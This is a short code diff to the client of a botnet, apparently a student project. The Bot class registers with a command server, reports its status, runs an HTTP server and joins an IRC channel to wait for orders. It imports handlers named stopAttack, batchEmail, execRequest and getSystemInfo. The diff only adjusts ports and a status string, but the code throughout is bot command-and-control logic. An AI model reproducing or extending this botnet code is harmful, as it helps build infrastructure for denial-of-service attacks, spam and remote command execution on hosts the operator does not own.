@@ -1,6 +1,5 @@
 import concurrent
 import socket
-import threading
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from concurrent.futures import ThreadPoolExecutor
 from httpServerRH import HTTPServerRH, stopAttack, batchEmail, execRequest, getSystemInfo, getStatus
@@ -51,7 +50,7 @@ class Bot:
     host = '127.0.0.1'
     port = 49171
     httpPort = 80
-    ircPort = 6697
+    ircPort = 6667
 
     def __init__(self):
         self.sendInfo()
@@ -67,7 +66,7 @@ class Bot:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((self.host, self.port))
             message = self.myIp + ' {"http":' + str(self.httpPort) + ',"irc":' + str(
-                self.ircPort) + ',"target":"","action":"waiting"}'
+                self.ircPort) + ',"target":"-","action":"waiting"}'
             while message != 'bot registrated succesfully':
                 s.send(message.encode())
                 message = s.recv(1024).decode()
@@ -80,7 +79,7 @@ class Bot:
     def httpServer(self):
         httpd = None
         try:
-            httpd = HTTPServer((self.myIp, self.httpPort), HTTPServerRH)
+            httpd = HTTPServer((self.myIp, 80), HTTPServerRH)
             httpd.serve_forever()
         except Exception as e:
             print("HTTP error: ", e)
@@ -96,6 +95,7 @@ class Bot:
             s.send(bytes(f"USER {NICKNAME} {self.myIp} {NICKNAME} :{NICKNAME}:\r\n", "UTF-8"))
 
             sendMessage(s, f"JOIN {CHANNEL}\r\n")
+
             while True:
                 readMessage(s)
         except Exception as e:
